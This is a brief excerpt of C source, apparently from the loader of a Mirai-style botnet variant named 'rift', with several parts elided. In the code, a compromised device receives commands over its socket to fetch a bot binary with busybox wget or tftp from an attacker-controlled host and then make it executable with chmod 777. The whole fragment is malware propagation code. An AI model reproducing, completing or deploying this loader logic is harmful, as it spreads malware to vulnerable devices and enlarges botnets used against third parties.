                        ...
                        if(consumed)
                        {
                            ...
                            switch(conn->info.upload_method)
                            {
                                ...
                                case UPLOAD_WGET:
                                    ...
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/rift.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
				                ...
				                case UPLOAD_TFTP:
                                    ...
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r rift.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
